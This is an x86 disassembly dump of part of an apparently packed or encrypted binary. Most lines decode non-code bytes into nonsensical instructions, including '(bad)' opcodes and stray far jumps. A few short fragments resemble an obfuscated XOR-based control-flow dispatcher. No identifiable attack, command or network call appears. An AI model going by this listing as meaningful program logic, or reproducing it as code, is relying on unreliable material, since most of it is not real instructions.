  40fa92:	int    0x91
  40fa94:	xor    DWORD PTR [ebx-0x42],eax
  40fa97:	dec    eax
  40fa98:	jle    0x40fae9
  40fa9a:	and    eax,0x4711577e
  40fa9f:	pop    esi
  40faa0:	mov    ecx,0x75a0ca8
  40faa5:	arpl   WORD PTR [ebx+0x7152ed48],ax
  40faab:	add    BYTE PTR [ebp+0x4058d116],bl
  40fab1:	dec    esp
  40fab2:	cli    
  40fab3:	cmp    BYTE PTR [ebp-0x797692e7],0x3d
  40faba:	cmp    BYTE PTR [edx-0x8],ah
  40fabd:	sar    DWORD PTR [ebx],cl
  40fabf:	mov    esi,DWORD PTR [esi+0x46941cb0]
  40fac5:	jo     0x40fabd
  40fac7:	xchg   BYTE PTR [eax-0x4b6a8eb5],al
  40facd:	outs   dx,BYTE PTR ds:[esi]
  40face:	out    0x12,eax
  40fad0:	mov    edx,0x8502c405
  40fad5:	shl    al,cl
  40fad7:	add    BYTE PTR [ebp+ecx*8-0x22c2e58f],dh
  40fade:	das    
  40fadf:	mov    cs,edx
  40fae1:	pushf  
  40fae2:	xor    eax,0xa19fd60a
  40fae7:	lds    ebp,FWORD PTR [edi]
  40fae9:	lods   al,BYTE PTR ds:[esi]
  40faea:	(bad)  
  40faeb:	adc    eax,0xa9a359f3
  40faf0:	push   edx
  40faf1:	inc    ebx
  40faf2:	repnz mov al,ds:0x52f54422
  40faf8:	jnp    0x40fac9
  40fafa:	sub    al,0x70
  40fafc:	mov    ds:0x5a83261c,eax
  40fb01:	dec    esp
  40fb02:	add    al,0x8e
  40fb04:	xchg   edx,eax
  40fb05:	and    al,0xa1
  40fb07:	call   0xdd47ec52
  40fb0c:	inc    eax
  40fb0d:	in     al,dx
  40fb0e:	cmp    BYTE PTR [eax],bl
  40fb10:	xchg   esp,eax
  40fb11:	test   dh,cl
  40fb13:	pushf  
  40fb14:	pop    ecx
  40fb15:	(bad)  
  40fb16:	fnstcw WORD PTR [eax-0x53]
  40fb19:	fwait
  40fb1a:	mov    ebx,0xcdcafa97
  40fb1f:	dec    esp
  40fb20:	add    esp,edi
  40fb22:	in     eax,0x27
  40fb24:	and    ch,BYTE PTR ds:0xad724d8c
  40fb2a:	sbb    ebp,ebp
  40fb2c:	sbb    bl,al
  40fb2e:	fimul  WORD PTR [ecx]
  40fb30:	test   al,0xd2
  40fb32:	(bad)  
  40fb33:	ds es repz popf 
  40fb37:	mov    ecx,0x7ffe8694
  40fb3c:	pop    ebp
  40fb3d:	imul   DWORD PTR [edi]
  40fb3f:	cmp    al,0x8f
  40fb41:	ret    
  40fb42:	inc    esp
  40fb43:	je     0x40fb2b
  40fb45:	sbb    eax,0x92ee2b47
  40fb4a:	pusha  
  40fb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb4c:	pusha  
  40fb4d:	bound  esi,QWORD PTR [edx-0x63]
  40fb50:	jnp    0x40fb82
  40fb52:	jge    0x40fbb2
  40fb54:	rol    DWORD PTR [edi],cl
  40fb56:	es jno 0x40fb6d
  40fb59:	aas    
  40fb5a:	(bad)  
  40fb5b:	std    
  40fb5c:	aad    0x55
  40fb5e:	xchg   ecx,eax
  40fb5f:	fimul  DWORD PTR gs:[ebx-0x49]
  40fb63:	int3   
  40fb64:	xchg   DWORD PTR [ebx+ebp*4-0x4d4f87fd],edx
  40fb6b:	and    al,0x38
  40fb6d:	dec    esi
  40fb6e:	outs   dx,BYTE PTR ds:[esi]
  40fb6f:	inc    ecx
  40fb70:	xor    al,0xe0
  40fb72:	or     BYTE PTR [edi-0x40],cl
  40fb75:	iret   
  40fb76:	mov    cl,0x4d
  40fb78:	push   ecx
  40fb79:	ret    0xc4f1
  40fb7c:	xchg   ebp,eax
  40fb7d:	loope  0x40fb62
  40fb7f:	test   BYTE PTR [edi+edx*4+0x4880c2e7],ch
  40fb86:	mov    BYTE PTR [eax+0x7b],dh
  40fb89:	mov    eax,0x700128bd
  40fb8e:	out    0xc4,al
  40fb90:	push   edi
  40fb91:	sub    BYTE PTR ds:0x8cd5cc0b,cl
  40fb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb98:	enter  0xa2f8,0xb7
  40fb9c:	sbb    BYTE PTR [eax+0x7d],al
  40fb9f:	mov    DWORD PTR [edi-0x4c],edx
  40fba2:	push   ds
  40fba3:	sub    ah,BYTE PTR [edx-0xcf95bd7]
  40fba9:	inc    ebp
  40fbaa:	sbb    BYTE PTR [edx+0x53b1d71c],ch
  40fbb0:	fnstcw WORD PTR [ebp-0x6350384c]
  40fbb6:	scas   eax,DWORD PTR es:[edi]
  40fbb7:	mov    al,ds:0xee3f2c0d
  40fbbc:	xor    eax,0xd58c6db4
  40fbc1:	scas   eax,DWORD PTR es:[edi]
  40fbc2:	pop    ecx
  40fbc3:	dec    BYTE PTR [esi]
  40fbc5:	xor    BYTE PTR [esi+eiz*2],al
  40fbc8:	and    al,0x7d
  40fbca:	call   0xd476:0xd58f13fd
  40fbd1:	es dec ax
  40fbd4:	sbb    edx,DWORD PTR [esi+0x47]
  40fbd7:	cdq    
  40fbd8:	push   ecx
  40fbd9:	or     al,0x55
  40fbdb:	fidiv  DWORD PTR [ebx+0x46c44ba1]
  40fbe1:	mov    al,0xe6
  40fbe3:	push   edi
  40fbe4:	je     0x40fbc7
  40fbe6:	xchg   BYTE PTR [eax-0x4d22d20a],ch
  40fbec:	or     cl,BYTE PTR [edi-0x38]
  40fbef:	in     eax,0xcf
  40fbf1:	fcomp  DWORD PTR [esi-0x3a028af2]
  40fbf7:	add    edi,0x2d
  40fbfa:	push   edx
  40fbfb:	mov    dh,0x49
  40fbfd:	cli    
  40fbfe:	fisub  WORD PTR [ebx+ebx*8]
  40fc01:	retf   
  40fc02:	add    al,0x72
  40fc04:	inc    ecx
  40fc05:	scas   eax,DWORD PTR es:[edi]
  40fc06:	jmp    0xf33c0d8f
  40fc0b:	push   ss
  40fc0c:	popf   
  40fc0d:	leave  
  40fc0e:	sbb    cl,ch
  40fc10:	and    eax,DWORD PTR [ecx+0x7a8445fa]
  40fc16:	adc    DWORD PTR [ebx+0x63],edi
  40fc19:	stos   BYTE PTR es:[edi],al
  40fc1a:	shr    BYTE PTR gs:[edi],1
  40fc1d:	jl     0x40fbb1
  40fc1f:	inc    ebx
  40fc20:	cs imul edx,eax,0x74
  40fc24:	sahf   
  40fc25:	mov    ecx,0xdeff9a09
  40fc2a:	inc    ebx
  40fc2b:	mov    dl,0x5a
  40fc2d:	scas   al,BYTE PTR es:[edi]
  40fc2e:	hlt    
  40fc2f:	in     eax,0xfb
  40fc31:	je     0x40fc09
  40fc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc34:	adc    dl,BYTE PTR [ebx]
  40fc36:	pop    ss
  40fc37:	popa   
  40fc38:	retf   
  40fc39:	ror    DWORD PTR [ecx+0x70bae08b],1
  40fc3f:	add    al,0x30
  40fc41:	call   0x15c1:0x23549174
  40fc48:	xor    eax,0x8475c4d3
  40fc4d:	xor    DWORD PTR [edi],edx
  40fc4f:	pop    ss
  40fc50:	and    DWORD PTR [eax+0x2276a22f],edi
  40fc56:	xchg   BYTE PTR [ebx],dh
  40fc58:	jno    0x40fc0d
  40fc5a:	leave  
  40fc5b:	inc    ecx
  40fc5c:	add    eax,0x980604d5
  40fc61:	xlat   BYTE PTR ds:[ebx]
  40fc62:	mov    bh,BYTE PTR [edi+0x65]
  40fc65:	int    0x29
  40fc67:	jns    0x40fcc7
  40fc69:	push   0x44086f00
  40fc6e:	into   
  40fc6f:	cmp    ebp,DWORD PTR [edx-0x13bb8e4b]
  40fc75:	fwait
  40fc76:	add    bh,ah
  40fc78:	sbb    ch,cl
  40fc7a:	dec    ecx
  40fc7b:	call   DWORD PTR [eax-0x1d42bd0e]
  40fc81:	lods   eax,DWORD PTR ds:[esi]
  40fc82:	fisub  WORD PTR [edi]
  40fc84:	cmp    ch,0x7d
  40fc87:	ret    0x8fa5
  40fc8a:	jl     0x40fc4a
  40fc8c:	je     0x40fce7
  40fc8e:	push   edx
  40fc8f:	adc    BYTE PTR [ecx],bh
  40fc91:	mov    WORD PTR [ecx],ds
  40fc93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc94:	push   eax
  40fc95:	or     eax,0x25671d7e
  40fc9a:	popa   
  40fc9b:	hlt    
  40fc9c:	mov    eax,ds:0x1fa6854f
  40fca1:	mov    edx,0x786f7bf8
  40fca6:	push   edi
  40fca7:	xchg   esi,eax
  40fca8:	jecxz  0x40fcce
  40fcaa:	sub    al,0xe0
  40fcac:	mov    esp,0x12cc3e9c
  40fcb1:	pop    es
  40fcb2:	jno    0x40fc3e
  40fcb4:	retf   
  40fcb5:	fucomp st(6)
  40fcb7:	sbb    eax,0x946f0020
  40fcbc:	xchg   edx,eax
  40fcbd:	inc    ecx
  40fcbe:	data16 test BYTE PTR [edx-0x4eeb53b3],al
  40fcc5:	jo     0x40fd0a
  40fcc7:	or     eax,ebx
  40fcc9:	pop    ebx
  40fcca:	mov    cl,0xd6
  40fccc:	ror    DWORD PTR [ebp+0x2040a031],1
  40fcd2:	js     0x40fce9
  40fcd4:	aaa    
  40fcd5:	test   al,0x8a
  40fcd7:	icebp  
  40fcd8:	into   
  40fcd9:	inc    esi
  40fcda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcdb:	in     al,0x5a
  40fcdd:	xchg   ebp,eax
  40fcde:	inc    edi
  40fcdf:	out    dx,al
  40fce0:	sbb    dh,0xd2
  40fce3:	fisttp QWORD PTR [ebp+0x63]
  40fce6:	jmp    0x2afcc4a
  40fceb:	retf   0x3763
  40fcee:	mov    ebx,0x39a5d170
  40fcf3:	push   esp
  40fcf4:	mov    bl,0x89
  40fcf6:	sbb    dh,ch
  40fcf8:	stos   BYTE PTR es:[edi],al
  40fcf9:	iret   
  40fcfa:	loopne 0x40fcfb
  40fcfc:	mov    al,0x91
  40fcfe:	push   ebx
  40fcff:	popf   
  40fd00:	and    BYTE PTR [ebx-0x28866503],al
  40fd06:	ror    DWORD PTR [edx],cl
  40fd08:	mov    cl,BYTE PTR [edx]
  40fd0a:	int    0x13
  40fd0c:	mov    eax,ds:0x1e500449
  40fd11:	cmp    bl,al
  40fd13:	xchg   ebp,eax
  40fd14:	dec    BYTE PTR [esp+ecx*1+0x352566ff]
  40fd1b:	push   ebp
  40fd1c:	or     BYTE PTR [ecx+0x7],dl
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	iret   
  40fd75:	pop    ebp
  40fd76:	xlat   BYTE PTR ds:[ebx]
  40fd77:	dec    eax
  40fd78:	fdiv   DWORD PTR [edi+0x7d497070]
  40fd7e:	jo     0x40fdf0
  40fd80:	jg     0x40fd64
  40fd82:	test   DWORD PTR [ebx+0x76],ebx
  40fd85:	aad    0x31
  40fd87:	push   0x8d790d72
  40fd8c:	rcl    DWORD PTR [esi+0x4f],cl
  40fd8f:	jae    0x40fdbb
  40fd91:	dec    ebp
  40fd92:	(bad)  
  40fd93:	imul   eax,DWORD PTR [ebp+0x55],0xa43c1001
  40fd9a:	mov    edx,0x94feec58
  40fd9f:	sub    BYTE PTR [esi-0x53],al
  40fda2:	aad    0x15
  40fda4:	clc    
  40fda5:	dec    ecx
  40fda6:	push   edx
  40fda7:	stos   BYTE PTR es:[edi],al
  40fda8:	mov    cl,0x90
  40fdaa:	pop    edi
  40fdab:	sub    dh,0xb
  40fdae:	mov    cl,0xff
  40fdb0:	arpl   cx,dx
  40fdb2:	xchg   esp,eax
  40fdb3:	pop    edx
  40fdb4:	mov    eax,ds:0xbedaa46d
  40fdb9:	dec    esi
  40fdba:	cdq    
  40fdbb:	in     al,0x3c
  40fdbd:	and    BYTE PTR [ecx],dh
  40fdbf:	aas    
  40fdc0:	fwait
  40fdc1:	in     eax,0x92
  40fdc3:	int    0x7c
  40fdc5:	add    DWORD PTR [esi],ebp
  40fdc7:	ficomp WORD PTR [edi+ebp*8-0x56]
  40fdcb:	aaa    
  40fdcc:	and    esp,DWORD PTR [ebx]
  40fdce:	ss dec ebx
  40fdd0:	leave  
  40fdd1:	sbb    bh,al
  40fdd3:	mov    al,0x4
  40fdd5:	cmp    esp,0x24513157
  40fddb:	fsub   DWORD PTR [edx-0x14e9e146]
  40fde1:	dec    ebp
  40fde2:	test   ebx,0x808fb91c
  40fde8:	dec    edi
  40fde9:	add    ecx,DWORD PTR [ebp+ebp*8-0x1c802da1]
  40fdf0:	inc    ecx
  40fdf1:	pop    eax
  40fdf2:	inc    edx
  40fdf3:	out    dx,al
  40fdf4:	lds    edi,FWORD PTR [ebx-0x68e5a9b2]
  40fdfa:	mov    al,ds:0x3bf0e45
  40fdff:	lods   al,BYTE PTR ds:[esi]
  40fe00:	add    bh,BYTE PTR [esi+0x17]
  40fe03:	pop    ebp
  40fe04:	scas   eax,DWORD PTR es:[edi]
  40fe05:	outs   dx,BYTE PTR ds:[esi]
  40fe06:	adc    ebp,DWORD PTR [ebp+ebp*4+0x8]
  40fe0a:	loop   0x40fd92
  40fe0c:	aad    0x8d
  40fe0e:	out    0x6e,eax
  40fe10:	call   0x85bc:0xc3a0f83d
  40fe17:	inc    edi
  40fe18:	loope  0x40fdcd
  40fe1a:	mov    DWORD PTR [eax+esi*4-0x5e],eax
  40fe1e:	dec    eax
  40fe1f:	(bad)  
  40fe20:	fcmove st,st(3)
  40fe22:	pop    edx
  40fe23:	leave  
  40fe24:	pop    ecx
  40fe25:	nop
  40fe26:	jns    0x40fe3d
  40fe28:	mov    ebx,0xde1cca06
  40fe2d:	shl    DWORD PTR [edi+0x2e306989],1
  40fe33:	add    BYTE PTR [edi],dh
  40fe35:	add    DWORD PTR ds:0xcc48b9bd,ecx
  40fe3b:	pop    eax
  40fe3c:	hlt    
  40fe3d:	(bad)
  40fe41:	repnz daa 
  40fe43:	pop    edx
  40fe44:	mov    BYTE PTR [edi-0x59],cl
  40fe47:	cwde   
  40fe48:	stc    
  40fe49:	xchg   ebx,eax
  40fe4a:	ins    BYTE PTR es:[edi],dx
  40fe4b:	push   esp
  40fe4c:	jecxz  0x40fde9
  40fe4e:	bound  edx,QWORD PTR [esi+esi*4]
  40fe51:	jno    0x40fe46
  40fe53:	sub    al,0x7
  40fe55:	scas   al,BYTE PTR es:[edi]
  40fe56:	ja     0x40fe97
  40fe58:	dec    ecx
  40fe59:	pushf  
  40fe5a:	fstp   QWORD PTR [esi]
  40fe5c:	aam    0xa2
  40fe5e:	mov    cl,0xb8
  40fe60:	cmp    dh,bh
  40fe62:	imul   al
  40fe64:	jmp    0xccc616f2
  40fe69:	adc    DWORD PTR [ebx-0x709aea74],edi
  40fe6f:	cs (bad) 
  40fe72:	imul   eax,DWORD PTR [ebx+0xe51bc3d],0xb
  40fe79:	add    DWORD PTR [edx],esp
  40fe7b:	outs   dx,BYTE PTR ds:[esi]
  40fe7c:	pop    esi
  40fe7d:	push   ebx
  40fe7e:	ins    BYTE PTR es:[edi],dx
  40fe7f:	inc    ecx
  40fe80:	jmp    0x27fb49c8
  40fe85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe86:	sar    DWORD PTR fs:[edx-0x26],cl
  40fe8a:	aam    0xff
  40fe8c:	add    al,0x4a
  40fe8e:	cwde   
  40fe8f:	fisub  DWORD PTR [ebx-0x5aa202]
  40fe95:	sahf   
  40fe96:	inc    esp
  40fe97:	mov    edx,0x38f522d9
  40fe9c:	arpl   WORD PTR [edx],si
  40fe9e:	loop   0x40fe31
  40fea0:	sbb    bl,0x9e
  40fea3:	sub    eax,edi
  40fea5:	loope  0x40feeb
  40fea7:	mov    ebx,0x9dc7b164
  40feac:	or     bl,0x6a
  40feaf:	or     DWORD PTR [edi-0x197b792a],0x11
  40feb6:	sub    al,0x90
  40feb8:	in     eax,0xb5
  40feba:	mov    al,ds:0x71430c04
  40febf:	inc    edi
  40fec0:	mov    BYTE PTR [ebp-0x33],ah
  40fec3:	inc    edx
  40fec4:	scas   eax,DWORD PTR es:[edi]
  40fec5:	push   ebp
  40fec6:	mov    eax,ds:0x83b2f67a
  40fecb:	jae    0x40ff38
  40fecd:	jno    0x40ff21
  40fecf:	push   0xffffff8b
  40fed1:	cmp    eax,0x90f8cbf0
  40fed6:	xchg   edi,eax
  40fed7:	fst    DWORD PTR [edi+0x68ecf974]
  40fedd:	xor    eax,0x4bba6520
  40fee2:	mov    esi,0x5026ba7a
  40fee7:	sbb    DWORD PTR [edx+0x22],esp
  40feea:	(bad)  
  40feeb:	lock lahf 
  40feed:	add    al,0xc
  40feef:	bound  eax,QWORD PTR [eax-0x58]
  40fef2:	out    0x1b,eax
  40fef4:	xchg   esp,eax
  40fef5:	push   eax
  40fef6:	sub    BYTE PTR cs:[ebp+0x3a],al
  40fefa:	rcr    BYTE PTR [ebp-0x1e8797fe],1
  40ff00:	jb     0x40ff3b
  40ff02:	rcl    BYTE PTR [ecx+0x23f5c0a5],0xad
  40ff09:	addr16 pop edi
  40ff0b:	mov    edi,?
  40ff0d:	(bad)  
  40ff0e:	fadd   QWORD PTR [edi]
  40ff10:	or     al,0x2a
  40ff12:	out    dx,al
  40ff13:	xor    ebp,edx
  40ff15:	pop    esi
  40ff16:	lea    ebx,[edx+0x66]
  40ff19:	test   eax,0x6251acbd
  40ff1e:	out    0x8,eax
  40ff20:	jno    0x40feeb
  40ff22:	and    al,0x3c
  40ff24:	mov    bh,0x91
  40ff26:	daa    
  40ff27:	popa   
  40ff28:	xchg   edi,eax
  40ff29:	dec    ecx
  40ff2a:	push   cs
  40ff2b:	push   0xffffffaf
  40ff2d:	sahf   
  40ff2e:	daa    
  40ff2f:	push   esp
  40ff30:	mov    al,0x9e
  40ff32:	pop    ecx
  40ff33:	pop    edx
  40ff34:	pop    esi
  40ff35:	push   edx
  40ff36:	aad    0x6a
  40ff38:	dec    esp
  40ff39:	dec    ecx
  40ff3a:	dec    esp
  40ff3b:	dec    edx
  40ff3c:	test   eax,0x4bc10dc5
  40ff41:	jo     0x40ff05
  40ff43:	push   ecx
  40ff44:	sbb    DWORD PTR [eax],esi
  40ff46:	sub    al,BYTE PTR [edx-0x311b485a]
  40ff4c:	out    0x26,eax
  40ff4e:	sub    eax,0xd94cb85a
  40ff53:	dec    esi
  40ff54:	(bad)  
  40ff56:	xor    al,0xb7
  40ff58:	and    dh,BYTE PTR [edx]
  40ff5a:	cmp    edx,0x648ccedd
  40ff60:	and    bl,dh
  40ff62:	add    DWORD PTR ss:[ebp-0x3312a9e0],esp
  40ff69:	jae    0x40ff4d
  40ff6b:	xor    dh,BYTE PTR [edx-0x482b5725]
  40ff71:	stos   BYTE PTR es:[edi],al
  40ff72:	mov    esp,0xd353d490
  40ff77:	stc    
  40ff78:	dec    ecx
  40ff79:	xor    edx,DWORD PTR [eax+0x1bf19c5b]
  40ff7f:	jge    0x40ff21
  40ff81:	aas    
  40ff82:	push   0xe99076ec
  40ff87:	in     eax,dx
  40ff88:	push   esi
  40ff89:	dec    ecx
  40ff8a:	lods   eax,DWORD PTR ds:[esi]
  40ff8b:	fucom  st(5)
  40ff8d:	or     al,0x95
  40ff8f:	stc    
  40ff90:	sub    DWORD PTR [ebx+0x71],ecx
  40ff93:	pop    ebp
  40ff94:	lds    esi,FWORD PTR [esi]
  40ff96:	xchg   ecx,eax
  40ff97:	or     al,0xde
  40ff99:	aad    0x34
  40ff9b:	pop    edx
  40ff9c:	ror    ebx,cl
  40ff9e:	cmp    eax,ecx
  40ffa0:	dec    esi
  40ffa1:	or     edx,DWORD PTR [ecx]
  40ffa3:	push   ecx
  40ffa4:	xor    al,0x34
  40ffa6:	imul   ecx,DWORD PTR [ebx+0x2f],0x27
  40ffaa:	imul   ebx,DWORD PTR [ebx+ebp*4+0x36],0x41ea9d81
  40ffb2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40ffb4:	in     eax,0x82
  40ffb6:	add    al,0xe4
  40ffb8:	aam    0xbf
  40ffba:	mov    ebp,0xd1b11dcf
  40ffbf:	in     al,dx
  40ffc0:	lds    edx,FWORD PTR [ecx]
  40ffc2:	jmp    0x4a31ede6
  40ffc7:	fnstenv [esi-0x1]
  40ffca:	outs   dx,DWORD PTR ds:[esi]
  40ffcb:	jg     0x410029
  40ffcd:	stos   DWORD PTR es:[edi],eax
  40ffce:	push   edi
  40ffcf:	add    BYTE PTR [ecx+eax*2],al
  40ffd2:	and    BYTE PTR [esi+0x622422c1],al
  40ffd8:	fadd   DWORD PTR [ebp-0x70]
  40ffdb:	bound  edi,QWORD PTR [edx-0x1f79564c]
  40ffe1:	loope  0x40ffea
  40ffe3:	loope  0x40ffa4
  40ffe5:	int    0xfd
  40ffe7:	popa   
  40ffe8:	add    eax,0x6035e64a
  40ffed:	lods   eax,DWORD PTR ds:[esi]
  40ffee:	add    ch,BYTE PTR [edi-0x2d]
  40fff1:	pop    ebx
  40fff2:	push   esp
  40fff3:	xlat   BYTE PTR ds:[ebx]
  40fff4:	bound  edi,QWORD PTR [ebx]
  40fff6:	fld    TBYTE PTR [esi+0x7e]
  40fff9:	imul   ebx,DWORD PTR [ebx-0x19],0x9e072f70
  410000:	mov    ebx,0xa52f81f
  410005:	dec    esi
  410006:	(bad)  
  410007:	adc    dl,bh
  410009:	mov    esp,0xc58449cc
  41000e:	lock stos DWORD PTR es:[edi],eax
  410010:	je     0x40fff2
  410012:	imul   esp,DWORD PTR [ebp+eax*1-0x721e6d95],0x6388182b
  41001d:	repnz lods eax,DWORD PTR ds:[esi]
  41001f:	pop    ebp
  410020:	pop    ss
  410021:	retf   0x4f9d
  410024:	fistp  DWORD PTR [ecx+0x189a6101]
  41002a:	outs   dx,DWORD PTR ds:[esi]
  41002b:	xchg   BYTE PTR [edx-0x2d],bh
  41002e:	or     ch,bl
  410030:	mov    ebx,0xc251d238
  410035:	xor    DWORD PTR [ebp+0x1d1a1559],edi
  41003b:	int    0x4e
  41003d:	jmp    0x4100ab
  41003f:	in     eax,dx
  410040:	cmp    dh,0x40
  410043:	dec    eax
  410044:	scas   al,BYTE PTR es:[edi]
  410045:	test   DWORD PTR [edx],ebp
  410047:	jb     0x410052
  410049:	gs mov dh,0x2b
  41004c:	aad    0xff
  41004e:	popa   
  41004f:	cwde   
  410050:	cdq    
  410051:	cdq    
  410052:	inc    esp
  410053:	call   0x63411fe
  410058:	jl     0x4100a8
  41005a:	add    esp,edi
  41005c:	sub    DWORD PTR [ecx-0x184b0ebb],edi
  410062:	(bad)  
  410063:	fld    TBYTE PTR [esi]
  410065:	btr    DWORD PTR [ecx-0x59],ecx
  410069:	dec    esi
  41006a:	and    dl,BYTE PTR [eax]
  41006c:	data16 sbb al,BYTE PTR [ebx-0x77c73892]
  410073:	pop    edi
  410074:	adc    BYTE PTR [eax+0x1f],0xd3
  410078:	sub    BYTE PTR [ebx+edi*2+0x72bcd07f],dl
  41007f:	adc    al,0xb5
  410081:	stos   BYTE PTR es:[edi],al
  410082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410083:	and    al,0x53
  410085:	shr    dh,0xbb
  410088:	enter  0x6203,0x1c
  41008c:	nop
  41008d:	outs   dx,DWORD PTR ds:[esi]
  41008e:	dec    ecx
  41008f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410090:	and    eax,0x54dca17b
  410095:	int    0x65
  410097:	mov    dl,0xc4
  410099:	xchg   esi,eax
  41009a:	and    eax,0xfedd4208
  41009f:	add    eax,0x926b1ae5
  4100a4:	mov    eax,ds:0xe295b610
  4100a9:	int    0x7
  4100ab:	mov    edi,0x8db6b830
  4100b0:	cmp    esp,DWORD PTR [edi+0x5af74688]
  4100b6:	fistp  QWORD PTR [edx]
  4100b8:	imul   ecx,edx,0x1a
  4100bb:	ret    
  4100bc:	aam    0x70
  4100be:	jl     0x4100b7
  4100c0:	add    al,0x3a
  4100c2:	push   edx
  4100c3:	div    DWORD PTR [ebx]
  4100c5:	je     0x410108
  4100c7:	enter  0x30ea,0x6d
  4100cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100cc:	mov    ecx,ecx
  4100ce:	xchg   ah,al
  4100d0:	or     DWORD PTR [ebp+0x78018d49],0x7fa0294d
  4100da:	sbb    DWORD PTR [edx+0x6b],eax
  4100dd:	popf   
  4100de:	adc    ecx,DWORD PTR [esi+0x36]
  4100e1:	lahf   
  4100e2:	jb     0x4100a6
  4100e4:	add    ebx,DWORD PTR [ecx]
  4100e6:	inc    esp
  4100e7:	cwde   
  4100e8:	or     al,0x35
  4100ea:	pop    ebx
  4100eb:	mov    bl,BYTE PTR [eax]
  4100ed:	out    dx,eax
  4100ee:	retf   0x48af
  4100f1:	fst    DWORD PTR [ecx-0x7c]
  4100f4:	inc    edx
  4100f5:	mov    edi,0xf012600c
  4100fa:	jmp    0x4100ed
  4100fc:	mov    DWORD PTR [ebp+0x7b71ce45],eax
  410102:	mov    ebx,0x7d3e3998
  410107:	push   edi
  410108:	xchg   ecx,ebx
  41010a:	xlat   BYTE PTR ds:[ebx]
  41010b:	loopne 0x4100a0
  41010d:	and    al,0xf2
  41010f:	call   0x5a28d343
  410114:	dec    eax
  410115:	mov    cl,0x8
  410117:	mov    esp,ebp
  410119:	in     eax,dx
  41011a:	test   BYTE PTR [edx-0x62],cl
  41011d:	ds jge 0x859062e5
  410124:	push   edx
  410125:	mov    DWORD PTR [ecx+0x55],edi
  410128:	push   ebx
  410129:	ror    BYTE PTR [edi+eax*2-0x164c20ed],0x5c
  410131:	xor    eax,0x7f1d981
  410136:	cmp    DWORD PTR [ebp+0x63],esp
  410139:	aas    
  41013a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013b:	or     dh,0xcf
  41013e:	pop    esi
  41013f:	outs   dx,BYTE PTR ds:[esi]
  410140:	stc    
  410141:	(bad)  
  410142:	stc    
  410143:	adc    BYTE PTR [eax+0x9],cl
  410146:	dec    ebp
  410147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410148:	xor    DWORD PTR [ebx-0x40],edi
  41014b:	fcom   DWORD PTR [esi-0x61]
  41014e:	sbb    esp,DWORD PTR ds:0x9b589498
  410154:	sti    
  410155:	sahf   
  410156:	jns    0x410193
  410158:	enter  0x850f,0xd
  41015c:	add    BYTE PTR [eax],al
  41015e:	add    BYTE PTR [ebx+0x5535fc45],cl
  410164:	or     BYTE PTR [ecx+0x7],dl
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	and    ebx,edi
  41018b:	bound  ebx,QWORD PTR [ecx+esi*1-0x4d]
  41018f:	jo     0x410201
  410191:	dec    ecx
  410192:	jge    0x410204
  410194:	jo     0x4101ee
  410196:	or     ebx,DWORD PTR [esi+0x6b]
  410199:	mov    BYTE PTR [esi],ch
  41019b:	addr16 dec ebx
  41019d:	sbb    DWORD PTR [ecx],edi
  41019f:	pop    ebx
  4101a0:	test   dl,ch
  4101a2:	pop    ss
  4101a3:	outs   dx,BYTE PTR ds:[esi]
  4101a4:	mov    dh,0x31
  4101a6:	and    al,BYTE PTR [edx+0x7c]
  4101a9:	aaa    
  4101aa:	jne    0x410211
  4101ac:	mov    bh,0x6f
  4101ae:	sub    eax,0x37dd475a
  4101b3:	inc    ebx
  4101b4:	scas   eax,DWORD PTR es:[edi]
  4101b5:	das    
  4101b6:	je     0x410220
  4101b8:	jae    0x410165
  4101ba:	out    0x7b,eax
  4101bc:	lea    edx,[ebx+0x77af5f63]
  4101c2:	iret   
  4101c3:	imul   ecx,DWORD PTR [esi+0x270af4e0],0xcef3b962
  4101cd:	add    edx,DWORD PTR [ebx+0x6089192e]
  4101d3:	mov    bh,0xe5
  4101d5:	sub    BYTE PTR ds:0x97b816e9,cl
  4101db:	mov    dl,0x98
  4101dd:	fnstenv [ebp-0x14]
  4101e0:	into   
  4101e1:	mov    ah,0x37
  4101e3:	ror    BYTE PTR [edx-0x23],1
  4101e6:	mov    al,0x20
